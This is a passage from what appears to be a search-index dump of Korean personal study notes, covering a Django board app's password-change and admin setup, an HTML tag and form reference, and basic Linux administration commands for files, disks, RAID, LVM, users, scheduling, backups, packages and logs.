지원하는 auth의 views를 사용한다. urls.py에서 template_name을 password_change_done.html로 지정하였다. boardapp/templates/password_change_done.html  \u0026lt;script\u0026gt;\ralert(\u0026#34;비밀번호 변경이 완료되었습니다.\u0026#34;);\rlocation.href=\u0026#34;{% url \u0026#39;main\u0026#39; %}\u0026#34;\r\u0026lt;/script\u0026gt;\rsetting.py LOGIN_REDIRECT_URL = \u0026#39;/boardapp/\u0026#39;\rLOGOUT_REDIRECT_URL = \u0026#39;/boardapp/\u0026#39;\rtest  base.html에서 완성된 부분을 #에서 name에 맞게 변경하고 runserver를 실시한다. 회원가입을 테스트한다.  id : admin 이름 : administrator email : admin@admin.com   앞으로 관리자 계정이 필요하므로 mysql에 접속하여 해당 user의 컬럼을 변경  is_superuser = 1 is_staff = 1   SQL : update auth_user set is_superuser = 1, is_staff = 1 where username = \u0026lsquo;admin\u0026rsquo;; admin 페이지에 접속하여 로그인을 테스트한다.  "});index.add({'id':163,'href':'/docs/programing/web/html/','title':"H T M L",'content':"HTML   \rHTML 기본양식\r...\r\r\u0026lt;head\u0026gt;\r\u0026lt;meta charset=\u0026quot;UTF-8\u0026quot;\u0026gt;\r\u0026lt;title\u0026gt;Title\u0026lt;/title\u0026gt;\r\u0026lt;style\u0026gt;\r\u0026lt;/style\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;/body\u0026gt;\r \r\r\r  태그   줄 바꾸기 \u0026lt;br\u0026gt;\r 구분선 \u0026lt;hr\u0026gt;\r 제목 \u0026lt;h1- h6\u0026gt; \u0026lt;/hn\u0026gt;\r 문단 \u0026lt;p\u0026gt; \u0026lt;/p\u0026gt;\r 입력을 그대로 표시하는 태그 \u0026lt;pre\u0026gt; \u0026lt;/pre\u0026gt;\r 인용문을 넣는 태그 \u0026lt;blockquote\u0026gt; \u0026lt;/blockquote\u0026gt;\r 인용문을 인 라인에 넣는 태그 \u0026lt;q\u0026gt; \u0026lt;/q\u0026gt;\r  text   밑줄 \u0026lt;u\u0026gt; \u0026lt;/u\u0026gt;\r 굵은 텍스트 \u0026lt;b\u0026gt; \u0026lt;/b\u0026gt;\r 텍스트 강조 \u0026lt;strong\u0026gt; \u0026lt;/strong\u0026gt;\r 형광펜 텍스트 \u0026lt;mark\u0026gt;\u0026lt;/mark\u0026gt;\r 동아시아 글자 표시 rt는 읽는 방법표기법 \u0026lt;ruby\u0026gt; \u0026lt;rt\u0026gt; \u0026lt;/rt\u0026gt; \u0026lt;/ruby\u0026gt;\r 이탤릭 체 Emphasized tag \u0026lt;em\u0026gt; \u0026lt;/em\u0026gt;\r 줄 찍 \u0026lt;del\u0026gt; \u0026lt;/del\u0026gt;\r 인설트 태그 \u0026lt;ins\u0026gt; \u0026lt;/ins\u0026gt;\r This is \u0026lt;sub\u0026gt; sub \u0026lt;sub\u0026gt; text \u0026lt;/sub\u0026gt; \u0026lt;/sub\u0026gt; \u0026lt; \u0026gt; 태그 요소 \u0026amp;lt; \u0026amp;gt;\r 스페이스바 \u0026amp;nbsp; 약자 속성, title 속성을 함께 사용가능 \u0026lt;addr\u0026gt; \u0026lt;/addr\u0026gt;\r 포스트에서 참고 내용을 표시 \u0026lt;cite\u0026gt; \u0026lt;/cite\u0026gt;\r 컴퓨터 인식코드 \u0026lt;code\u0026gt; \u0026lt;/code\u0026gt;\r 키보드, 음성 입력 \u0026lt;kbd\u0026gt; \u0026lt;/kbd\u0026gt;\r 작게 표시 (부가정보) \u0026lt;small\u0026gt; \u0026lt;/small\u0026gt;\r 아래 첨자 \u0026lt;sub\u0026gt; \u0026lt;/sub\u0026gt;\r 위 첨자 \u0026lt;sup\u0026gt; \u0026lt;/sup\u0026gt;\r 취소선 \u0026lt;s\u0026gt; \u0026lt;/s\u0026gt;\r  List  #list\r\u0026lt;ul\u0026gt; \u0026lt;li\u0026gt; \u0026lt;/li\u0026gt;\r\u0026lt;li\u0026gt; \u0026lt;/li\u0026gt;\r\u0026lt;li\u0026gt; \u0026lt;/li\u0026gt;\r\u0026lt;/ul\u0026gt;\rul의 종류: disc, circle, sqaure, none\r\u0026lt;ol\u0026gt;\r\u0026lt;li\u0026gt; \u0026lt;/li\u0026gt;\r\u0026lt;li\u0026gt; \u0026lt;/li\u0026gt;\r\u0026lt;li\u0026gt; \u0026lt;/li\u0026gt;\r\u0026lt;ol\u0026gt;\rol의 종류: 1, i, l, a, A, none\r\u0026lt;dl\u0026gt;\r\u0026lt;dt\u0026gt; \u0026lt;/dt\u0026gt;\r\u0026lt;dd\u0026gt; \u0026lt;/dd\u0026gt;\r\u0026lt;dt\u0026gt; \u0026lt;/dt\u0026gt;\r\u0026lt;dd\u0026gt; \u0026lt;/dd\u0026gt;\r\u0026lt;/dl\u0026gt;\r\u0026lt;h1 style= \u0026#34; 설정 값 \u0026#34; \u0026gt; \u0026lt;/h1\u0026gt;\rp {\rcolor : xx;\rbackground: xx;\radding: xx;\r}\rxx-color: rgb(x,x,x);\r#xxxxxx;\rhsl(x,x%,x%)\r  링크태그   인터넷 링크 \u0026lt;a href=\u0026#34;링크할 주소\u0026#34; [속성=\u0026#34;속성 값\u0026#34;]\u0026gt; \u0026lt;/a\u0026gt;\r\u0026lt;a href =\u0026#34;도메인 주소\u0026#34;\u0026gt; \u0026lt;/a\u0026gt;\ra 태그 안에서 사용 가능한 요소\rhref\r링크한 문서나 사이트의 주소를 입력\rtarget\r링크한 내용이 표시될 위치를 지정\rtarget =\u0026#34;_blank\u0026#34; 링크 내용이 새 창이나 새 탭에서 열림\r열림\r표시\r전체 화면에 표시\rdownload\r링크한 내용을 보여주는 것이 아니라 다운로드\rrel\r현재 문서와 링크한 문서의 관계를 알려줌\rhreflang\r링크한 문서의 언어를 지정\rtype\r링크한 문서의 파일 유형을 알려줌\ra 대신 iframe을 사용시 액자식 구성 사용 가능\r앵커 기능\r\u0026lt;태그 id=\u0026#34;앵커 이름\u0026#34;\u0026gt; 텍스트 또는 이미지\u0026lt;/태그\u0026gt;\r\u0026lt;a href=\u0026#34;#앵커 이름\u0026#34;\u0026gt;텍스트 또는 이미지\u0026lt;/a\u0026gt;\r  이미지 링크  \u0026lt;img src=\u0026quot;이미지의 경로\u0026quot; 속성값=\u0026quot;\u0026quot;\u0026gt;\rwidth=\u0026quot;n\u0026quot;\r이미지의 넓이를 지정\rheight=\u0026quot;n\u0026quot;\r이미지의 높이를 지정\ralt=\u0026quot;설명\u0026quot;\r이미지의 설명을 지정\r\u0026lt;figure\u0026gt; 요소 \u0026lt;/figure\u0026gt;\r\u0026lt;figcaption\u0026gt; 설명 \u0026lt;/figcaption\u0026gt;\r요소로 묶은 것에 대한 설명을 붙임\r\u0026lt;map name=\u0026quot;이름\u0026quot;\u0026gt;\r\u0026lt;area\u0026gt;\r\u0026lt;area shape=\u0026quot;rect\u0026quot; coords=\u0026quot;n,n,n,n\u0026quot; href=\u0026quot;주소\u0026quot; alt=\u0026quot;설명\u0026quot;\u0026gt;\r...\r\u0026lt;/map\u0026gt;\r\u0026lt;img src=\u0026quot;이미지 파일\u0026quot; usemap=\u0026quot;#맵이름\u0026quot;\u0026gt;\r맵의 속성\ralt\r대체할 텍스트를 지정\rcoords\r링크로 사용할 영역을 시작 좌표와 끝 좌표를 이용해 지정\rdownload\r링크를 클릭했을 때 링크 문서를 다운로드\rhref\r링크 문서(사이트) 경로를 지정\rmedia\r링크 문서(사이트)를 어떤 미디어에 최적화시킬지 지정\rrel\r현재 문서와 링크 문서 사이의 관계를 지정\rshape\r링크로 사용할 영역의 형태를 지정\rtarget\r링크를 표시할 대상을 지정\rtype\r링크 문서의 미디어 유형을 지정\r#talbe\r\u0026lt;table\u0026gt;\r\u0026lt;th\u0026gt;제목 칸\u0026lt;/th\u0026gt;\r\u0026lt;tr\u0026gt; 1행\r\u0026lt;th\u0026gt; 1열 \u0026lt;/th\u0026gt;\r\u0026lt;td colspan=\u0026quot;2\u0026quot;\u0026gt;\u0026lt;/td\u0026gt;\r\u0026lt;tr\u0026gt; 2행\r\u0026lt;th\u0026gt; 1열 \u0026lt;/th\u0026gt;\r\u0026lt;td rowspan=\u0026quot;2\u0026quot;\u0026gt;\u0026lt;/td\u0026gt;\r\u0026lt;/table\u0026gt;\r\u0026lt;caption\u0026gt; \u0026lt;/caption\u0026gt;\rtable 태그 뒤에 오며 표 제목\r\u0026lt;figcaption\u0026gt; \u0026lt;/figcaption\u0026gt;\r제목을 표 앞이나 뒤에 붙일 수 있음\r\u0026lt;p id=\u0026quot;summary\u0026quot;\u0026gt; 설명\u0026lt;/p\u0026gt;\r\u0026lt;talbe aria-describedby=\u0026quot;summary\u0026quot;\u0026gt;\r서머리의 설명 값을 출력\r\u0026lt;/talbe\u0026gt;\r\u0026lt;colgroup\u0026gt;\r\u0026lt;col style=\u0026quot;\u0026quot;\u0026gt;\r\u0026lt;col span=\u0026quot;n\u0026quot;\u0026gt;\r\u0026lt;/colgroup\u0026gt;\r inline 타그\n#form tag\r\u0026lt;form 속성=\u0026quot;속성 값\u0026quot;\u0026gt; 여러 폼 요소\u0026lt;/form\u0026gt;\rform 태그의 속성\rmethod\r사용자가 입력한 내용들을 서버 쪽 프로그램으로 어떻게 넘겨줄지 지정합니다.\rget - 주소 표시줄을 사용자가 입력한 내용이 그대로 드러납니다.\rpost - 대부분 이 방식을 이용 입력 내용에 길이에 제한을 받지 않음\rname\r폼의 이름을 지정\raction\r태그 안의 내용들을 처리해 줄 서버 상의 프로그램을 지정\rtarget\r태그에서 지정한 스크립트 파일을 현재 창이 아닌 다른 위치에서 열도록 지정\rautocomplete\r자동완성기능 (자동으로 켜져있음)\r\u0026lt;label [속성 =\u0026quot;속성 값\u0026quot;] \u0026gt; 레이블 \u0026lt;input ...\u0026gt; \u0026lt;/label\u0026gt;\r\u0026lt;label for=\u0026quot;id이름\u0026quot;\u0026gt; 레이블 \u0026lt;/label\u0026gt;\r\u0026lt;input id=\u0026quot;id이름\u0026quot; [속성 = \u0026quot;속성 값\u0026quot;]\u0026gt;\r\u0026lt;fieldset [속성=\u0026quot;속성 값\u0026quot;]...\u0026gt; \u0026lt;/fieldset\u0026gt;\r태그 사이의 폼들을 하나의 영역으로 묶어 줌\r\u0026lt;legend\u0026gt; 제목 \u0026lt;/legend\u0026gt;\rfieldset의 안에 사용하며 내용을 나눠주는 데 사용되어짐\r input 태그  \u0026lt;input type=\u0026quot;유형\u0026quot; [속성 =\u0026quot;속성 값\u0026quot;]\u0026gt;\rinput 타입의 요소\rhidden\r사용자에게 보이지 않지만 서버로 넘겨지는 값을 가짐\rtext\r한 줄 짜리 텍스트를 입력할 수 있는 상자를 넣음\rname - 텍스트 필드를 구별할 수 있도록 이름을 붙임\rsize - 텍스트 필드의 길이를 지정\rvalue - 텍스트 필드 요소가 화면에 표시될 때 텍스트 필드 부분에 표시될 내용\rmaxlengh - 텍스트 필드에 입력할 수 있는 최대 문자 개수\r\u0026lt;textarea name=\u0026quot;\u0026quot; id=\u0026quot;\u0026quot; cols=\u0026quot;30\u0026quot; rows=\u0026quot;10\u0026quot;\u0026gt;\u0026lt;/textarea\u0026gt;\rsearch\r검색상자\rtel\r전화번호 입력 필드\rurl\rURL 주소 입력 필드\remail\r메일 주소 입력 필드\rpassword\r비밀번호 입력 필드\rdatetime\r국제 표준시로 설정된 날짜와 시간\rdatetime-local\r사용자가 있는 지역을 기준 지정\rdate\rmonth\rweek\rtime\r사용자가 있는 지역을 기준으로 지정\rmin 날짜나 시간의 최솟값을 지정\rmax 날짜나 시간의 최댓값을 지정\rstep 스핀 박스의 화사룦를 누를 때마다 날짜나 시간을 얼마나 조절할지를 지정\rvalue 화면에 표시할 초기값을 지정\rnumber\r숫자를 조절할 수 있는 화살표를 지정\rrange\r숫자를 조절할 수 있는 슬라이드 막대를 넣음\rmin - 필드에 입력할 수 있는 최솟값을 지정\rmax - 필드에 입력할 수 있는 최댓값을 지정\rstep - 짝수나 홀수 등 특정 숫자로 제한하려고 할 떄 숫자 간격을 지정할 수 있음\rvalue - 필드에 표시할 초기 값\rcolor\r색상표를 넣음\rcheckbox\r주어진 항목에서 2개 이상 선택 가능한 체크 박스를 넣음\rradio\r주어진 항목에서 1개만 선택할 수 있는 라이도 버튼을 넣음\rname - 이름 값을 지정\rvalue - 필수 속성이며 서버로 알려줄 값\rchecked - 체크 되어 있는지 아닌지 기본 0 file\r파일을 첨부할 수 있는 버튼을 넣음\rsubmit\r서버 전송 버튼을 넣음\rimage\rsubmit 버튼 대신 사용할 이미지를 넣음\rreset\r리셋 버튼을 넣음\rbutton\r버튼을 넣음\rautofocus\r실행시 여기 칸으로 실행\rplaceholder\r힌트 표시하기\rreadonly\rtrue or false 읽기전용으로 바꿈\rrequired\r필수 값\rformaction\r실행할 프로그램을 연결 submit, image일 때 사용가능\rformenctype\r서버로 전송할 때의 폼 데이터를 결정 submit, image일 때 사용가능\rformmethod\r서버로 전송하는 방식 get, post를 지정\rformnovalidate\r유효성 여부를 확인\rmultiple 여러 값을 입력\rselect\r여러 선택사항 표시\r\u0026lt;select 속성=\u0026quot;속성 값\u0026quot;\u0026gt;\r\u0026lt;option value=\u0026quot;값\u0026quot; [속성=\u0026quot;속성 값\u0026quot;]\u0026gt; 내용1\u0026lt;/option\u0026gt;\r\u0026lt;option value=\u0026quot;값\u0026quot; [속성=\u0026quot;속성 값\u0026quot;]\u0026gt; 내용2\u0026lt;/option\u0026gt;\r\u0026lt;option value=\u0026quot;값\u0026quot; [속성=\u0026quot;속성 값\u0026quot;]\u0026gt; 내용3\u0026lt;/option\u0026gt;\r\u0026lt;/select\u0026gt;\r속성값 size, multiple\r\u0026lt;option\u0026gt;태그의 속성\rvalue, selected(화면에 표시될 때 기본 속성)\r\u0026lt;optgroup label= \u0026quot;제목\u0026quot;\u0026gt; \u0026lt;/optgroup\u0026gt;\r옵션끼리 묶기\r\u0026lt;datalist id=\u0026quot;값\u0026quot;\u0026gt;\r\u0026lt;option value=\u0026quot;값\u0026quot; label=\u0026quot;값\u0026quot;\u0026gt;\u0026lt;/option\u0026gt;\r\u0026lt;/datalist\u0026gt;\rbutton\r\u0026lt;button [type=\u0026quot;submit | reset | button\u0026quot;]\u0026gt; 내용 \u0026lt;/button\u0026gt;\r\u0026lt;output [속성=\u0026quot;속성 값\u0026quot;]\u0026gt; 내용 \u0026lt;/output\u0026gt;\r\u0026lt;progress value = \u0026quot;값\u0026quot; [max = \u0026quot;값\u0026quot;]\u0026gt; \u0026lt;/progress\u0026gt;\r 데이터를 전송하는 용도로 사용되는 태그 Form 내부에 입력된 데이터를 서버로 전송하거나 JavaScript에서 사용할 수 있다\naction attribute 데이터가 전송될 곳의 주소를 입력\nmethod attribute 데이터가 전송될 방식을 입력\n #style\r#sns \u0026gt; ul \u0026gt; li{\r가능\r}\r   input 태그   \u0026lt;form action=\u0026#34;14_entity.html\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt;\r\u0026lt;input name =\u0026#34;id\u0026#34; type=\u0026#34;text\u0026#34;\u0026gt;\r\u0026lt;input name =\u0026#34;pw\u0026#34; type=\u0026#34;password\u0026#34;\u0026gt;\r\u0026lt;input type=\u0026#34;submit\u0026#34;\u0026gt;\r\u0026lt;type = \u0026#34; text, password, radio, checkbox, color, date, email, file\u0026#34;\u0026gt;\r= \u0026#34;range\u0026#34; min =\u0026#34;n\u0026#34; max=\u0026#34;n\u0026#34;\r"});index.add({'id':164,'href':'/docs/system/linux/linux/','title':"Linux",'content':"Linux   Linux 기초   유닉스 기반의 컴퓨터 운영체제의 한 종류 핀란드 헬싱키 대학의 대학원생 리누스 토발즈가 1991년에 개발 오픈 소스의 운영체제 대표적인 리눅스 기관 GNU 높은 이식성과 확정성 ( C언어 기반 ) 안전성과 신뢰성 ( 국제적이고 개방적으로 개발되었기 때문에 문제점에 대한 대처가 빠름 ) 계층적 파일 시스템 ( 최상위 디렉토리가 존재하고 모든 것들은 해당 디렉토리 하부에 존재 )   유닉스 운영체제 종류  리눅스의 구성요소   명령어 : 사용자가 원하는 프로그램을 콜링\n  쉘 : 명령어를 컴퓨터가 알아들을 수 있는 언어로 번역\n  커널 : 운영체제의 핵심부분 ( 하드웨어 관리 및 사용자의 명령어 전달 )\n  H/W : 물리적 장비\n   Linux의 명령 프롬프트  명령어가 기다리고 있음을 가리키기 위해 화면에 나타나는 표시 일반적으로 리눅스의 프롬프트는 현재 작업 디렉토리, 현재 로그인한 사용자 등에 대한 정보를 표시  명령줄 인터페이스\n 텍스트 터미널을 통해 사용자와 컴퓨타가 상호 작용하는 방식을 뜻함 즉, 작업 명령은 사용자가 컴퓨터 키보드 등을 통해 문자열의 형태로 입력하며 컴퓨터로부터의 출력 역시 문자열의 형태로 주어진다.   명령어의 구조\n 명령어 : 시스템에서 특정 작업을 하기 위해 실행하는 실행파일, 프로그램 옵션 : 명령어를 어떻게 실행할 것인지 지정 ( 일반적으로 대시 ( - ) 문자 뒤에 옵션을 지정 ) 아규먼트 ( Argument ) : 명령어에 의해서 영향을 받는 파일 or 디렉토리 등 특정 대상  ex) netstat -anp, ifconfig -a, ls -al      Linux의 절대경로와 상대경로\n 명령어를 사용할 때 경로를 입력하는 방식은 2가지가 있다. 절대 경로 : 최상위 디렉토리인 /에서부터 특정 파일 또는 디렉토리의 경로를 모두 입력 상대 경로 : 현재 작업 디렉토리를 기준으로 특정 파일 또는 디렉토리의 경로를 입력  /\r최상위 디렉토리\r./\r현재위치\r../\r전 위치 \u0026quot;-\u0026quot; 와 동일\r  Linux 명령어   환경변수  HOME : 사용자의 홈 디렉토리\rPATH : 실행파일을 찾는 경로\rLANG : 프로그램 사용시 기본으로 지원되는 언어\rSHELL : 로그인해서 사용하는 쉘\rEDITOR : 기본 편집기의 이름\rPSI : 명령 프롬프트 변수\r  Linux 기본 명령어 pwd 현재 디렉토리 확인\rcd [ 이동할 경로 ]\r작업 디렉토리 변경\rls [ 확인 할 디렉토리 ]\r디렉토리 내용 확인\rls -al\r숨겨진 파일까지 모두 표시\r-l은 보다 자세한 결과 검은색은 실행파일, 파란색을 디렉토리 파일을 의미\rmkdir [ 생성할 디렉토리 이름 ]\r지정한 이름으로 된 디렉토리 생성 ( 하위 구조도 함께 생성 : -p )\rrmdir [ 삭제할 디렉토리 이름 ]\r디렉토리 삭제\rrm -rf [ 삭제할 디렉토리, 파일 이름]\rr은 디렉토리 f는 파일을 의미\rmv [ 원본 경로 ] [ 이동할 경로 ]\r디렉토리 혹은 파일을 이동 및 이름 변경\rcp -r [ 원본 경로 ] [ 이동할 경로 ]\rr은 디렉토리를 포함해서 복사할 때 필요\rtouch [ 파일 이름 ]\r내용이 아무것도 없는 빈 파일 생성\rcat [ 파일 ]\r파일의 내용을 전부 확인\rhead [ 파일 ]\r파일의 내용을 시작부터 몇 줄만 확인 기본 10줄\rtail [ 파일 ]\r파일의 내용을 끝에서 몇 줄만 확인 기본 10줄\rmore [ 파일 ]\r파일의 내용을 화면에 맞춰서 확인\r  grep grep [ 옵션 ] [ 패턴 ] [ 파일 이름 ]\r \rGrep 폼 설명\r...\r\r 옵션   i : 대소문자 무시\n  n : 줄 번호 표시\n  v : 패턴을 제외한 내용만 출력\n  w : 단어 단위로 검색\n  c : 매칭되는 줄 수 표시\n  l : 매칭되는 패턴이 있는 파일 이름 출력\n      패턴   정규표현식 : 어떤 문자를 표현할 때 다양한 특수문자를 이용해 표현하는 방식\n  ^ : 줄의 시작을 지정 ( 해당 패턴이 줄의 시작인 경우 캡쳐 )\n ex) ^root    $줄의 마지막을 지정\n ex) root$    . : 한 문자 대치\n ex) r..t    \u0026ldquo;*\u0026rdquo; : 여러 문자 대치\n ex) r*    [ ] : 패턴 중 한 문자 일치\n ex) [ r ]oot    [^] : 패턴 중 제외할 문자 지정\n ex) [^ T]oor T를 제외한 oot 부분 출력        \r\r\r    fgrep fgrep [ 옵션 ] [ 패턴 ] [ 파일 이름 ]\r grep에서 특수문자가 포함된 경우 사용     find find [ 경로 ] [ 조건 ] [ 아규먼트 ] [ 행동 ]\rex) find / -name file -exec rm -rf {} \\;\r \rfind 폼 설명\r...\r\r 경로 : 어디를 기준으로 검색 할 것인지를 입력    조건 : 어떤 조건으로 검색할 것인지를 입력   name : 이름으로 검색\n  type : 파일의 타입으로 검색 ( d : 디렉토리 | f : 파일 )\n  perm : 권한으로 검색\n  user : 소유자로 검색\n  size : 파일 크기로 검색 +는 이상, -는 이하, 단위는 512바이트 C 바이트, k키로 바이트, M 메가바이트, G 기가바이트\n  atime : 파일의 마지막 접근 시간으로 검색\n  mtime : 파일의 마지막 수정 시간으로 검색\n       아규먼트 : 조건에 맞는 값을 입력\n  행동 : 검색 결과를 어떻게 처리할 것인지를 입력\n  ls : 자세한 결과 출력\n  exec [ 명령어 ] {} ; 검색할 파일을 특정 명령어로 실행\n ex) -exec rm -rf {} ;      \r\r\r  하드 추가  fdisk -l\r# 현재 장착된 하드디스크 목록\rdfisk /dev/sd[n]\r# 새로 장착한 하드디스크의 파티션 설정 및 포맷\r# 새로운 파티션 만들기 n\r# 확장 e, 새로운 파티션 p\r# 상세설명 읽기\r# w 내용저장\rmkfs -t [ 포맷 방식 ] /dev/[ 생성된 sd ]\r# 포맷\rmount /dev/[ 생성된 sd ] [ 마운트 할 폴더 ]\rmount\r# 마운트 진행\rdf -h\r# 전체 다이렉트 구조 출력\r  하드링크와 심볼링 링크  ln [ 옵션 ] [ 원본 ] [ 링크 ]\r# 하드 링크\rln -s [ 옵션 ] [ 원본 ] [ 링크 ]\r# 심볼릭 링크\r \r하드 링크와 심볼릭 링크\r...\r\r Link   특정 파일 또는 디렉토리에 접근을 쉽게 할 수 있도록 하는 방법 파일 시스템이 물리적인 장치인 하드 디스크 상에 저장되어 특정 파일의 위치를 가리키는 것 하드링크는 실질적인 디스크 상의 파일을 가르키며, 심볼릭링크는 파일 시스템 상의 특정 파일을 나타냄 \r\r\r\r   권한  chomod [ 권한 ] [ 파일 또는 디렉토리 ]\r \r권한\r...\r\r권한   리눅스의 파일을 사용할 수 있는 권한 기본적으로 022 ( 기본권한 : 읽기만가능 ) 권한은 8진수 혹은 심볼릭 모드로 입력이 가능  심볼릭  옥텟 ( 8진수 ) 모드 \r\r\r   프로세스  ps [ 옵션 ]\rpstree\rpgrep\r \r프로세스\r...\r\r프로세스  윈도우 관리자와 비슷한 명령어   시그널 번호 \r\r\r   압축\u0026amp; 아키이브  tar [ 기능 ] [ 아카이브 파일 ] [ 묶음 파일 1 ] [ 묶음 파일 2 ]...\rzip [ 압축 파일 이름 ] [ 압축할 파일 이름 ]\runzip [ 압축 파일 이름 ]\rgzip [ 압축 파일 이름 ]\rgunzip [ 압축 파일 이름 ]\rbzip2 [ 압축 파일 이름 ]\rbunzip2 [ 압축 파일 이름 ]\r \r아카이브\r...\r\r아카이브  여러 파일을 하나의 묶음으로 보관하는 것 아카이브는 용량이 줄지 않음 기능 -c : 새로운 아카이브 파일 생성 -x : 아카이브 파일에서 여러 파일을 해제 -t : 아카이브 파일에서 안의 내용을 조회 -v : verbose, 명령어 수행과정을 자세히 출력 -f : 아카이브 장치 지정 ( 파일 또는 백업 장치를 지정 ) \r\r\r\r   사용자관리  useradd [ 옵션 ] [ 아규먼트 ] [ 사용자이름 ]\r# 유저 생성\rusermode [ 옵션 ] [ 아규먼트 ] [ 사용자이름 ]\r# 유저 변경\ruserdel -r [ 유저이름 ]\r# 유저 삭제\rpasswd [ 사용자명 ]\r# 사용자의 패스워드 변경\rgroupadd | groupmod | groupdel\r \r사용자관리\r...\r\r사용자관리   /etc/passwd : 사용자의 기본 정보를 저장하고 있는 파일     /etc/shadow : 사용자의 패스워드를 저장하고 있는 파일     /etc/group : 그룹에 대한 정보를 저장하고 있는 파일     useradd     usermode     passwd     패스워드 정책 설정 파일 /etc/security/pwquality.conf /etc/login.defs \r\r\r\r   RAID  mdadm --create /dev/md/linear --level linear --raid-devices=2 /dev/sdb1 /dev/sdc1\r# RAID 0 구성 : Linear\rmdadm --create /dev/md/mirror --level mirror --raid-devices=2 /dev/sdb1 /dev/sdc1\r# RAID 1 구성 : Stripte\rmdadm --create /dev/md/raid5 --level=5 --raid-devices=3 /dev/sdb1 /dev/sdc1 /dev/sdd1\r# RAID 5 구성 : 5\rmdadm --stop [ RAID 장치명 ]\r# RAID 구성 삭제\rmdadm --zero-superblock [ 파티션 장치명 ]\r# RAID 파티션 구성 삭제\r \rRAID\r...\r\rRAID   mdadm 명령어  \u0026ndash;create : 생성할 RAID 장치의 이름 \u0026ndash;level : RAID 레벨을 지정 \u0026ndash;raid-devices : RAID에 추가될 실제 장치의 파티션 지정 \u0026ndash;detail : 특정 장치의 상세 내력을 출력   \r\r\r\r   LVM  # 모든 LVM은 fdisk를 이용한 파티션 설정 후\rpvcreate [ /dev/sdb1 ]\r# PV 생성\rpvscan\r# PV 확인\rvgcreate [ /dev/sdb1 /dev/sdb2 ]\r# VG 생성\rvgscan vgdisplay\r# 확인, 자세히 확인\rlvcreate [ -n test ] [ -L 15GB ] [ 빌려갈 vg 이름 ]\r# lvscan 확인\rlvextend -L + 5GB /dev/vg/test\r# 용량 증설\rLinear: lvcreate --type raid00 -L [ 크기 ] [ VG 이름 ]\rStripe: lvcreate --type raid0 --stripes [ 디스크 수 ] --stripesize [ 크기 ] [ VG }\r# RAID 0 구성\rmirror: lvcreate --type mirror [ 미러 수 ] VG\r# RAID 1 구성 ( 미러는 복사되는 장치의 수 ) lvcreate --type raid5 --stripes [ 디스크 수 ] --stripesize [ 크기 ] VG\r# RAID 5 구성\r \rLVM\r...\r\rLVM ( Logical Volume Manager )   논리 볼륨을 효율적이고 유연하게 관리하기 위한 커널의 한 부분이자 프로그램 기존 방식에서는 파일 시스템이 블록 장치에 직접 접근해서 읽고/ 쓰기를 했다. LVM을 사용하면 파일 시스템이 LVM이 만든 가상의 블록장치에 읽고/ 쓰기를 구행하며, 이를 통하여 다양한 기능 제공   LVM의 구조  PE : 파티션 개념 ( 초기화 필요 ) PV : PE를 묶어 둔 것 VG : PV가 모여 된 것으로, 필요한 만큼 빌려서 사용 가능    LE : LV를 이루는 가장 작은 단위로 PE와 동일한 개념을 가짐 LV : VG와 동일한 개념을 가짐    마운트 이후 사용  \r\r\r   작업 스케줄링  at [ 시간 ]\rat -l\r# 작업 조회\rat -r [ 작업 번호 ]\r# 작업 삭제\rcrontab -e\r# 작업 예약\rcrontab -l\r# 작업 조회\rcrontab -r\r# 작업 삭제\r \r작업 스케줄링\r...\r\r작업 스케줄링   crontab -e : 반복 작업 스케쥴링 명령어  \r\r\r\r   백업 및 복구  tar zcvpf [ 아카이브 이름 ] --exclude = [ 예외 ]/\r# 예외를 제외하고 전체를 백업\rtar zcvpf [ 아카이브 이름 ] -g [ 리스트 파일 이름 ] [ 경로 ]\r# -g 옵션을 이용하면 리스트를 만들어 백업 정보를 따로 저장 ( -p는 기존의 파일 시스템의 권한 정보를 그대로 유지 )\rtar zxvpf [ 아카이브 이름 ] -C [ 복구할 경로 ] -g [ 리스트 파일 이름 ]\r# C 옵션을 이용해서 아카이브 및 압축을 해제하면 특정 경로를 지정해 해당 경로에 풀 수 있다.\rdump [ 옵션 ]f [ 백업 장치 ] [ 백업 대상 ]\r# 0~ 9: 증분 or 차분 백업, 0은 전체백업을 의미\rrestore -rvf [ 백업 파일 or 장치 ]\r# 복구 명령어를 실행하면 작업 디렉토리에 restoresymtable 파일 생성\rdd = [ 백업할 장치 ] of = [ 저장할 위치 ] [ bs = [ 크기 ]] count = [ 숫자 ]\r# dd를 이용한 백업\rdd if = [ 백업할 장치 ] of = [ 저장할 위치 ] [ bs = [ 크기 ] ] count = [ 숫자 ]\r# dd를 이용한 복구\r \r백업 및 복구\r...\r\r백업 및 복구   언제 발생할 지 모르는 사고를 대비해 반드시 해야하는 것 \r\r\r\r   소프트웨어 패키지 rpm, 소스 코드, yum  rpm -lvh [ 패키지 ]\r# rpm을 통한 설치\r./configure\rmake\rmake install\r# 소스 코드를 이용한 관리\ryum install [ 패키지명 ]\r# yum을 통한 설치\r \rrpm\r...\r\rrpm ( Redhat Package Manager )   rpm     소스 코드  ./configure: 컴퓨터 환경 설정 파일 make: makefile의 내용대로 컴파일 하는 파일 make install: 컴파일 된 파일을 설치하는      yum  yum : 레포지터리에서 다운 및 설치하는 명령어 yum install [ 패키지명 ] ( *: 관련 패키지 모두 설치 ) 의존성 있는 파일을 모두 설치해준다 yum erase [ 패키지명 ]: 해당 패키지 삭제 yum upgrade [ 패키지명 ]: 해당 패키지 업그레이드   \r\r\r\r   Log  /etc/rsyslog.conf\r[ Facility ].[ Level ] [ Action ]\r \rLog\r...\r\rLog   컴퓨터 또는 프로그램의 사용 기록  로그의 종류  Facility  kern: 커널이 발생한 메시지 user: 사용자 프로세스 mail: mail 시스템 관련 서비스 damon: telnetd, ftpd, httpd와 관련된 서비스 auth: 로그인과 같은 인증 관련 서비스 syslog: syslog 관련 서비스 cron: 예약작업 관련 서비스, crond, atd *: 모든 서비스를 의미   Level  emerge: 일반적으로 모든 사용자에게 전달되는 패닉 상황 ( 블루스크린, 커널 패닉 ) alert: 시스템 DB에 손상 등 즉시 수정해야되는 상황 crit: 하드 장치 오류 등 중대한 상황에 대한 경고 err: 하등 장치 이외의 오류 warning: 경고 메시지, 무시해도 됨 notice: 특별한 처리가 필요할 수 있는 비오류 상황 info: 정보 메시지 debug: 프로그램 개발 또는 테스트 할 때 사용 none: 로그로 기록 \r\r\r\r   메모리  free\r# 메모리 공간을 확인 할 때 사용\rtop\r# 프로세스 정보와 CPU 정보를 할께 살펴볼 수 있는 명령어\rSWAP\r# 메모리의 여유 공간을 디스크에 확보하는 명령어\r \r메모리\r...\r\r메모리   커널이 